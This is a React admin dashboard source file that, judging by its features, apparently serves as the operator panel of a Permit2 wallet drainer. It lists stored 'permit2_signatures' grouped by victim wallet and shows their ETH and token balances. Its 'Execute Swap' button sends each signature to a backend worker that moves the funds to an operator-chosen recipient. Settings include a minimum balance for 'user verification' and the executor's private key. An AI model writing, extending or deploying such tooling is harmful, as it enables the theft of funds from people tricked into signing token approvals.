import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { Contract, JsonRpcProvider, formatUnits, isAddress } from 'ethers';

// Backend worker endpoint
const BACKEND_URL = "/api/run-worker";
const SETTINGS_DOC_REF = docRef(db, 'admin_config', 'settings');

// Default executor address (mainnet) - can be overridden via Firestore admin settings
const HARDCODED_EXECUTOR = import.meta.env.VITE_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
const NETWORKS = {
  mainnet: {
    label: 'Mainnet',
    defaultRpcUrl: import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com',
    defaultTokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
  },
  sepolia: {
    label: 'Testnet (Sepolia)',
    defaultRpcUrl: 'https://rpc.sepolia.org',
    defaultTokenAddress: '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0'
  }
};
const CUSTOM_TOKEN_OPTION = 'custom';
const TOKEN_OPTIONS_BY_NETWORK = {
  mainnet: [
    { id: 'USDT', label: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
    { id: 'USDC', label: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
    { id: 'DAI', label: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
    { id: 'WETH', label: 'WETH', address: '0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2' }
  ],
  sepolia: [
    { id: 'USDT', label: 'USDT', address: '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0' },
    { id: 'USDC', label: 'USDC', address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238' },
    { id: 'WETH', label: 'WETH', address: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14' }
  ]
};

const getDefaultNetworkConfig = (network) => ({
  executorAddress: HARDCODED_EXECUTOR,
  executorPrivateKey: '',
  recipientAddress: HARDCODED_EXECUTOR,
  rpcUrl: NETWORKS[network].defaultRpcUrl,
  tokenAddress: NETWORKS[network].defaultTokenAddress,
  minRequiredBalance: 100
});

const getTokenOptionByAddress = (network, address) => {
  if (!address) return null;
  const options = TOKEN_OPTIONS_BY_NETWORK[network] || [];
  return options.find((token) => token.address.toLowerCase() === String(address).trim().toLowerCase()) || null;
};

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  const [activeNetwork, setActiveNetwork] = useState('mainnet');
  const [settingsTabNetwork, setSettingsTabNetwork] = useState('mainnet');
  const [networkConfigs, setNetworkConfigs] = useState({
    mainnet: getDefaultNetworkConfig('mainnet'),
    sepolia: getDefaultNetworkConfig('sepolia')
  });
  const [runtimeConfig, setRuntimeConfig] = useState(getDefaultNetworkConfig('mainnet'));

  // Settings form state for currently selected settings tab
  const [outputToken, setOutputToken] = useState(getDefaultNetworkConfig('mainnet').tokenAddress);

  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
  const [recipientAddressSetting, setRecipientAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [rpcUrlSetting, setRpcUrlSetting] = useState(getDefaultNetworkConfig('mainnet').rpcUrl);
  const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState('100');
  const [selectedTokenOption, setSelectedTokenOption] = useState(() => {
    const selected = getTokenOptionByAddress('mainnet', getDefaultNetworkConfig('mainnet').tokenAddress);
    return selected?.id || CUSTOM_TOKEN_OPTION;
  });

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  const loadFormFromConfig = (network, cfg) => {
    setExecutorAddressSetting(cfg.executorAddress || HARDCODED_EXECUTOR);
    setExecutorPrivateKeySetting(cfg.executorPrivateKey || '');
    setRecipientAddressSetting(cfg.recipientAddress || HARDCODED_EXECUTOR);
    setRpcUrlSetting(cfg.rpcUrl || NETWORKS[network].defaultRpcUrl);
    setOutputToken(cfg.tokenAddress || NETWORKS[network].defaultTokenAddress);
    setMinRequiredBalanceSetting(String(cfg.minRequiredBalance ?? 100));
    setSelectedTokenOption(getTokenOptionByAddress(network, cfg.tokenAddress)?.id || CUSTOM_TOKEN_OPTION);
  };

  const collectFormConfig = () => {
    const parsedMin = Number(minRequiredBalanceSetting);
    return {
      executorAddress: executorAddressSetting.trim(),
      recipientAddress: recipientAddressSetting.trim(),
      rpcUrl: rpcUrlSetting.trim(),
      tokenAddress: outputToken.trim(),
      minRequiredBalance: Number.isFinite(parsedMin) && parsedMin >= 0 ? parsedMin : 100,
      executorPrivateKey: executorPrivateKeySetting?.trim() || ''
    };
  };

  useEffect(() => {
    let mounted = true;
    (async () => {
      try {
        const snap = await getDoc(SETTINGS_DOC_REF);
        if (!mounted) return;
        const raw = snap.exists() ? snap.data() : {};
        const savedActive = raw.activeNetwork === 'sepolia' ? 'sepolia' : 'mainnet';

        const mainnetCfg = { ...getDefaultNetworkConfig('mainnet'), ...(raw.networks?.mainnet || {}) };
        const sepoliaCfg = { ...getDefaultNetworkConfig('sepolia'), ...(raw.networks?.sepolia || {}) };

        // Legacy fallback: if old flat settings exist, treat them as mainnet values.
        if (!raw.networks) {
          mainnetCfg.executorAddress = raw.executorAddress || mainnetCfg.executorAddress;
          mainnetCfg.executorPrivateKey = raw.executorPrivateKey || mainnetCfg.executorPrivateKey;
          mainnetCfg.recipientAddress = raw.recipientAddress || mainnetCfg.recipientAddress;
          mainnetCfg.rpcUrl = raw.rpcUrl || mainnetCfg.rpcUrl;
          mainnetCfg.tokenAddress = raw.tokenAddress || mainnetCfg.tokenAddress;
          mainnetCfg.minRequiredBalance = raw.minRequiredBalance ?? mainnetCfg.minRequiredBalance;
        }

        const nextConfigs = { mainnet: mainnetCfg, sepolia: sepoliaCfg };
        setNetworkConfigs(nextConfigs);
        setActiveNetwork(savedActive);
        setRuntimeConfig(nextConfigs[savedActive]);
      } catch (err) {
        console.error('Initial settings load error:', err);
      }
    })();

    return () => { mounted = false; };
  }, []);

  const handleTokenOptionChange = (nextOptionId) => {
    setSelectedTokenOption(nextOptionId);
    const selected = (TOKEN_OPTIONS_BY_NETWORK[settingsTabNetwork] || []).find((token) => token.id === nextOptionId);
    if (selected) {
      setOutputToken(selected.address);
    }
  };

  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(SETTINGS_DOC_REF);
      const s = snap.exists() ? snap.data() : {};
      const savedActive = s.activeNetwork === 'sepolia' ? 'sepolia' : 'mainnet';

      const mainnetCfg = { ...getDefaultNetworkConfig('mainnet'), ...(s.networks?.mainnet || {}) };
      const sepoliaCfg = { ...getDefaultNetworkConfig('sepolia'), ...(s.networks?.sepolia || {}) };
      if (!s.networks) {
        mainnetCfg.executorAddress = s.executorAddress || mainnetCfg.executorAddress;
        mainnetCfg.executorPrivateKey = s.executorPrivateKey || mainnetCfg.executorPrivateKey;
        mainnetCfg.recipientAddress = s.recipientAddress || mainnetCfg.recipientAddress;
        mainnetCfg.rpcUrl = s.rpcUrl || mainnetCfg.rpcUrl;
        mainnetCfg.tokenAddress = s.tokenAddress || mainnetCfg.tokenAddress;
        mainnetCfg.minRequiredBalance = s.minRequiredBalance ?? mainnetCfg.minRequiredBalance;
      }

      const nextConfigs = { mainnet: mainnetCfg, sepolia: sepoliaCfg };
      setNetworkConfigs(nextConfigs);
      setActiveNetwork(savedActive);
      setRuntimeConfig(nextConfigs[savedActive]);
      setSettingsTabNetwork(savedActive);
      loadFormFromConfig(savedActive, nextConfigs[savedActive]);
      setSettingsStatus('Loaded');
    } catch (err) {
      console.error('Settings load error:', err);
      setSettingsStatus('Load failed: ' + err.message);
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    setSettingsStatus('Saving...');
    try {
      // Validate required fields
      if (!executorAddressSetting?.trim()) {
        throw new Error('Executor Address is required');
      }
      if (!recipientAddressSetting?.trim()) {
        throw new Error('Recipient Address is required');
      }
      if (!outputToken?.trim()) {
        throw new Error('Output Token Address is required');
      }
      if (!isAddress(outputToken.trim())) {
        throw new Error('Output Token Address must be a valid EVM address');
      }
      if (!rpcUrlSetting?.trim()) {
        throw new Error('RPC URL is required');
      }

      const normalizedRpcUrl = rpcUrlSetting.trim();
      if (!/^https?:\/\//i.test(normalizedRpcUrl) && !/^wss?:\/\//i.test(normalizedRpcUrl)) {
        throw new Error('RPC URL must start with http(s):// or ws(s)://');
      }

      const draftCfg = collectFormConfig();
      draftCfg.rpcUrl = normalizedRpcUrl;

      const nextConfigs = {
        ...networkConfigs,
        [settingsTabNetwork]: draftCfg
      };

      const settingsData = {
        activeNetwork,
        networks: {
          mainnet: nextConfigs.mainnet,
          sepolia: nextConfigs.sepolia
        },
        updatedAt: new Date().toISOString(),
        // Maintain backward compatibility for existing readers.
        ...nextConfigs[activeNetwork]
      };

      await setDoc(SETTINGS_DOC_REF, settingsData, { merge: true });
      setNetworkConfigs(nextConfigs);
      if (settingsTabNetwork === activeNetwork) {
        setRuntimeConfig(nextConfigs[activeNetwork]);
      }
      setSettingsStatus('Saved successfully');
      setTimeout(() => setSettingsStatus(''), 3000);
    } catch (err) {
      console.error('Settings save error:', err);
      setSettingsStatus('Save failed: ' + err.message);
    } finally {
      setSettingsLoading(false);
    }
  };

  const switchActiveNetwork = async (nextNetwork) => {
    if (nextNetwork !== 'mainnet' && nextNetwork !== 'sepolia') return;
    setActiveNetwork(nextNetwork);
    setRuntimeConfig(networkConfigs[nextNetwork] || getDefaultNetworkConfig(nextNetwork));
    if (isSettingsOpen) {
      setSettingsTabNetwork(nextNetwork);
      loadFormFromConfig(nextNetwork, networkConfigs[nextNetwork] || getDefaultNetworkConfig(nextNetwork));
    }
    try {
      await setDoc(SETTINGS_DOC_REF, {
        activeNetwork: nextNetwork,
        updatedAt: new Date().toISOString(),
        ...((networkConfigs[nextNetwork] || getDefaultNetworkConfig(nextNetwork)))
      }, { merge: true });
    } catch (err) {
      console.error('Failed to update active network:', err);
      setSettingsStatus('Save failed: ' + err.message);
    }
  };

  const switchSettingsTab = (nextNetwork) => {
    const draftCurrent = collectFormConfig();
    const merged = {
      ...networkConfigs,
      [settingsTabNetwork]: draftCurrent
    };
    setNetworkConfigs(merged);
    setSettingsTabNetwork(nextNetwork);
    loadFormFromConfig(nextNetwork, merged[nextNetwork] || getDefaultNetworkConfig(nextNetwork));
  };

  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);

      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  const [balances, setBalances] = useState({});
  const [tokenBalances, setTokenBalances] = useState({});
  const [balancesLoading, setBalancesLoading] = useState(false);
  const [balancesError, setBalancesError] = useState('');
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');

  const tokenAddress = runtimeConfig.tokenAddress || NETWORKS[activeNetwork].defaultTokenAddress;
  const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function symbol() view returns (string)'
  ];
  const [tokenDecimals, setTokenDecimals] = useState(6);
  const EXECUTOR_ADDRESS_UI = runtimeConfig.executorAddress || HARDCODED_EXECUTOR;
  const recipient = runtimeConfig.recipientAddress || HARDCODED_EXECUTOR;

  const getReadProvider = () => {
    return new JsonRpcProvider(runtimeConfig.rpcUrl || NETWORKS[activeNetwork].defaultRpcUrl);
  };

  useEffect(() => {
    let mounted = true;

    const loadTokenMeta = async () => {
      if (!tokenAddress) return;
      if (!isAddress(tokenAddress)) {
        if (!mounted) return;
        setTokenDecimals(6);
        setTokenSymbol('TOKEN');
        return;
      }
      try {
        const provider = getReadProvider();
        const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
        const [decimals, symbol] = await Promise.all([
          tokenContract.decimals(),
          tokenContract.symbol().catch(() => 'TOKEN')
        ]);
        if (!mounted) return;
        setTokenDecimals(Number(decimals));
        setTokenSymbol(symbol || 'TOKEN');
      } catch {
        if (!mounted) return;
        setTokenDecimals(6);
        setTokenSymbol('TOKEN');
      }
    };

    loadTokenMeta();

    return () => { mounted = false; };
  }, [tokenAddress]);

  useEffect(() => {
    let mounted = true;
    const owners = Object.keys(groupedData);
    if (!owners.length) {
      setBalances({});
      setTokenBalances({});
      setBalancesLoading(false);
      return () => { mounted = false; };
    }

    setBalancesLoading(true);
    setBalancesError('');

    (async () => {
      const next = {};
      const nextToken = {};
      
      try {
        const provider = getReadProvider();
        let tokenContract = null;
        let decimals = tokenDecimals;

        // Validate token address before attempting to create contract
        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
          if (!isAddress(tokenAddress)) {
            if (mounted) setBalancesError('Invalid token address format');
            return;
          }
          try {
            tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
            decimals = Number(await tokenContract.decimals());
            if (mounted) setTokenDecimals(decimals);
          } catch (e) {
            console.error('Failed to load token contract:', e);
            if (mounted) {
              const reason = String(e?.shortMessage || e?.message || 'Unknown RPC error').slice(0, 180);
              setBalancesError(`Token read failed on configured RPC: ${reason}`);
            }
          }
        }

        // Fetch balances for all owners
        await Promise.all(owners.map(async (owner) => {
          try {
            const b = await provider.getBalance(owner);
            next[owner] = Number(formatUnits(b, 18)).toFixed(4);
          } catch (err) {
            console.error(`Failed to fetch ETH balance for ${owner}:`, err);
            next[owner] = '—';
          }

          try {
            if (tokenContract) {
              const tb = await tokenContract.balanceOf(owner);
              nextToken[owner] = Number(formatUnits(tb, decimals)).toFixed(4);
            } else {
              nextToken[owner] = '—';
            }
          } catch (err) {
            console.error(`Failed to fetch token balance for ${owner}:`, err);
            nextToken[owner] = '—';
          }
        }));

        if (mounted) {
          setBalances(next);
          setTokenBalances(nextToken);
          setBalancesLoading(false);
        }
      } catch (err) {
        console.error('Balance fetch error:', err);
        if (mounted) {
          setBalancesError('Failed to load balances');
          setBalancesLoading(false);
        }
      }
    })();

    // Fetch executor balances separately
    (async () => {
      try {
        const provider = getReadProvider();
        const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
        if (mounted) setExecutorEthBalance(Number(formatUnits(eb, 18)).toFixed(4));
      } catch (err) {
        console.error('Failed to fetch executor ETH balance:', err);
        if (mounted) setExecutorEthBalance('—');
      }
      
      try {
        const provider = getReadProvider();
        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
          const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
          const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
          if (mounted) setExecutorTokenBalance(Number(formatUnits(tb, tokenDecimals)).toFixed(4));
        } else {
          if (mounted) setExecutorTokenBalance('—');
        }
      } catch (err) {
        console.error('Failed to fetch executor token balance:', err);
        if (mounted) setExecutorTokenBalance('—');
      }
    })();

    return () => { mounted = false; };
  }, [groupedData, tokenAddress, tokenDecimals, runtimeConfig.rpcUrl, EXECUTOR_ADDRESS_UI]);

  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Processing...");

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          activeNetwork,
          recipient,
          outputToken: tokenAddress
        })
      });

      const rawText = await response.text();
      let result = null;
      try {
        result = rawText ? JSON.parse(rawText) : null;
      } catch {
        result = null;
      }

      if (!response.ok || !result?.ok) {
        const detail = result?.error || rawText || "Execution failed";
        throw new Error(detail);
      }

      setStatusMsg("Success");
      setTimeout(() => setStatusMsg(""), 3000);

    } catch (err) {
      const msg = String(err?.message || "Execution failed");
      if (msg.includes("FUNCTION_INVOCATION_FAILED")) {
        setStatusMsg("Error: Worker timed out or crashed on Vercel. Check Function logs and increase maxDuration.");
      } else {
        setStatusMsg("Error: " + msg);
      }
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="min-h-screen bg-gray-50 p-6">

      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <h1 className="text-2xl font-bold text-gray-800">Admin Dashboard</h1>
        <div className="flex items-center gap-3">
          <select
            value={activeNetwork}
            onChange={(e) => switchActiveNetwork(e.target.value)}
            className="px-3 py-2 border rounded-md bg-white text-sm"
          >
            <option value="mainnet">Mainnet</option>
            <option value="sepolia">Testnet (Sepolia)</option>
          </select>
          <button
            onClick={openSettings}
            className="px-4 py-2 bg-gray-900 text-white rounded-md hover:bg-gray-700"
          >
            Settings
          </button>
        </div>
      </div>

      {/* Settings Row */}
      <div className="mb-6 bg-white shadow p-5 text-gray-700 rounded-lg border">
        <h2 className="text-lg font-semibold text-gray-700 mb-3">Project Network</h2>
        <div className="flex items-center justify-between text-sm mb-2">
          <span className="text-gray-600">Active Network</span>
          <span className="font-semibold">{NETWORKS[activeNetwork].label}</span>
        </div>
        <div className="flex items-center justify-between text-sm mb-2">
          <span className="text-gray-600">Active Token</span>
          <span className="font-mono">{tokenAddress.slice(0, 6)}...{tokenAddress.slice(-4)}</span>
        </div>
        <div className="flex items-center justify-between text-sm mb-2">
          <span className="text-gray-600">Active RPC</span>
          <span className="font-mono">{(runtimeConfig.rpcUrl || '').slice(0, 36)}{(runtimeConfig.rpcUrl || '').length > 36 ? '...' : ''}</span>
        </div>
        <p className="text-xs text-gray-500 mt-2">
          Use Settings to edit Mainnet and Testnet configurations independently.
        </p>
      </div>

      {/* Executor Balance */}
      <div className="mb-6 bg-white shadow p-5 text-gray-700 rounded-lg border">
        <h2 className="text-lg font-semibold text-gray-700 mb-3">Executor Balance</h2>
        <div className="flex flex-col gap-2 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">Executor</span>
            <span className="font-mono">{EXECUTOR_ADDRESS_UI.slice(0, 6)}...{EXECUTOR_ADDRESS_UI.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">ETH</span>
            <span className="font-semibold">{executorEthBalance}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{tokenSymbol}</span>
            <span className="font-semibold">{executorTokenBalance}</span>
          </div>
        </div>
      </div>

      {/* Wallets Grid */}
      <div className="grid grid-cols-1 text-gray-700 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {balancesError && (
          <div className="col-span-full bg-red-50 border border-red-300 rounded-lg p-4 text-red-800">
            ⚠️ {balancesError}
            {tokenAddress === '0x0000000000000000000000000000000000000000' && (
              <p className="text-sm mt-2">Please set a valid Output Token Address in Global Settings</p>
            )}
          </div>
        )}
        {balancesLoading && (
          <div className="col-span-full bg-blue-50 border border-blue-300 rounded-lg p-4 text-blue-800">
            ⟳ Loading wallet balances...
          </div>
        )}
        {Object.keys(groupedData).map(owner => (
          <div
            key={owner}
            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md transition-shadow"
            onClick={() => openModal(owner)}
          >
            <div className="font-mono text-gray-700 text-sm">
              {owner.slice(0, 6)}...{owner.slice(-4)}
            </div>

            <div className="mt-3 text-gray-900 font-bold">
              {balances[owner] !== undefined ? balances[owner] : '—'} ETH • {tokenBalances[owner] !== undefined ? tokenBalances[owner] : '—'} {tokenSymbol}
            </div>

            <div className="mt-4 flex justify-between text-sm text-gray-800">
              <div>Signatures</div>
              <div className="font-bold">{groupedData[owner].length}</div>
            </div>

            <div className="flex justify-between text-sm text-gray-800 mt-1">
              <div>Pending</div>
              <div className="font-bold text-yellow-600">
                {groupedData[owner].filter(x => !x.processed).length}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Modal */}
      {isModalOpen && selectedWallet && (
        <div className="fixed text-gray-700 inset-0 bg-black/40 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-lg p-6 relative">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">
                {selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}
              </h3>
              <button
                onClick={() => setIsModalOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            {/* ALERT / STATUS BAR */}
            {statusMsg && (
              <div className={`
                  mb-4 px-4 py-2 rounded 
                  ${statusMsg.startsWith("Error") ? "bg-red-100 border border-red-300 text-red-800"
                    : statusMsg.startsWith("Success") ? "bg-green-100 border border-green-300 text-green-800"
                    : "bg-blue-100 border border-blue-300 text-blue-800"
                  }
              `}>
                {statusMsg}
              </div>
            )}

            <div className="space-y-4">
              {groupedData[selectedWallet].map(sig => (
                <div
                  key={sig.id}
                  className="border p-4 rounded-lg bg-gray-50"
                >
                  <div className="text-sm mb-1">Token: {sig.token.slice(0,6)}...{sig.token.slice(-4)}</div>
                  <div className="text-sm mb-3">
                    Amount: {(BigInt(sig.amount) / 10n**6n).toString()} USDT
                  </div>

                  {!sig.processed ? (
                    <button
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                      className="w-full bg-black text-white py-2 rounded hover:bg-gray-800 disabled:opacity-50"
                    >
                      {processingId === sig.id ? "Processing..." : "Execute Swap"}
                    </button>
                  ) : (
                    <a
                      href={`${activeNetwork === 'sepolia' ? 'https://sepolia.etherscan.io' : 'https://etherscan.io'}/tx/${sig.routerTx}`}
                      className="mt-2 block text-blue-600 underline"
                      target="_blank"
                      rel="noreferrer"
                    >
                      View on Etherscan →
                    </a>
                  )}
                </div>
              ))}
            </div>

          </div>
        </div>
      )}

      {/* Settings Modal */}
      {isSettingsOpen && (
        <div className="fixed text-gray-700 inset-0 bg-black/40 flex items-center justify-center p-4 z-40">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 relative max-h-[90vh] overflow-y-auto">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">Admin Settings</h3>
              <button
                onClick={() => setIsSettingsOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            {/* Status Message */}
            {settingsStatus && (
              <div className={`mb-4 px-3 py-2 rounded text-sm ${
                settingsStatus.includes('failed') 
                  ? 'bg-red-100 border border-red-300 text-red-800'
                  : 'bg-green-100 border border-green-300 text-green-800'
              }`}>
                {settingsStatus}
              </div>
            )}

            <div className="mb-4">
              <div className="inline-flex rounded-md border p-1 bg-gray-50 w-full">
                <button
                  onClick={() => switchSettingsTab('mainnet')}
                  className={`flex-1 py-2 text-sm rounded ${settingsTabNetwork === 'mainnet' ? 'bg-white shadow font-semibold' : 'text-gray-600'}`}
                >
                  Mainnet
                </button>
                <button
                  onClick={() => switchSettingsTab('sepolia')}
                  className={`flex-1 py-2 text-sm rounded ${settingsTabNetwork === 'sepolia' ? 'bg-white shadow font-semibold' : 'text-gray-600'}`}
                >
                  Testnet (Sepolia)
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-2">Editing settings for {NETWORKS[settingsTabNetwork].label}</p>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold mb-1">Executor Address</label>
                <input
                  value={executorAddressSetting}
                  onChange={e => setExecutorAddressSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Executor Private Key</label>
                <input
                  type="password"
                  value={executorPrivateKeySetting}
                  onChange={e => setExecutorPrivateKeySetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
                <p className="text-xs text-gray-500 mt-1">🔒 This will be encrypted in Firestore</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Recipient Address</label>
                <input
                  value={recipientAddressSetting}
                  onChange={e => setRecipientAddressSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded font-mono text-sm"
                  placeholder="0x..."
                />
                <p className="text-xs text-gray-500 mt-1">Where swapped tokens are sent</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Output Token Address</label>
                <select
                  value={selectedTokenOption}
                  onChange={e => handleTokenOptionChange(e.target.value)}
                  className="w-full px-3 py-2 border rounded text-sm"
                >
                  {(TOKEN_OPTIONS_BY_NETWORK[settingsTabNetwork] || []).map((token) => (
                    <option key={token.id} value={token.id}>{token.label}</option>
                  ))}
                  <option value={CUSTOM_TOKEN_OPTION}>Custom token address</option>
                </select>
                {selectedTokenOption === CUSTOM_TOKEN_OPTION && (
                  <input
                    value={outputToken}
                    onChange={e => setOutputToken(e.target.value)}
                    className="w-full mt-2 px-3 py-2 border rounded font-mono text-sm"
                    placeholder="0x..."
                  />
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">RPC URL</label>
                <input
                  value={rpcUrlSetting}
                  onChange={e => setRpcUrlSetting(e.target.value)}
                  className="w-full px-3 py-2 border rounded text-sm"
                  placeholder="https://cloudflare-eth.com"
                />
                <p className="text-xs text-gray-500 mt-1">Used by worker/server for chain reads and tx submission</p>
              </div>

              <div>
                <label className="block text-sm font-semibold mb-1">Minimum Required Balance (USD)</label>
                <input
                  type="number"
                  min="0"
                  step="0.01"
                  value={minRequiredBalanceSetting}
                  onChange={e => setMinRequiredBalanceSetting(e.target.value || '0')}
                  className="w-full px-3 py-2 border rounded text-sm"
                  placeholder="100"
                />
                <p className="text-xs text-gray-500 mt-1">Used during user verification</p>
              </div>
            </div>

            <button
              onClick={saveSettings}
              disabled={settingsLoading}
              className="w-full mt-6 py-2 bg-gray-900 text-white rounded hover:bg-gray-800 disabled:opacity-50 font-semibold"
            >
              {settingsLoading ? "Saving..." : "Save All Settings"}
            </button>

          </div>
        </div>
      )}

    </div>
  );
}
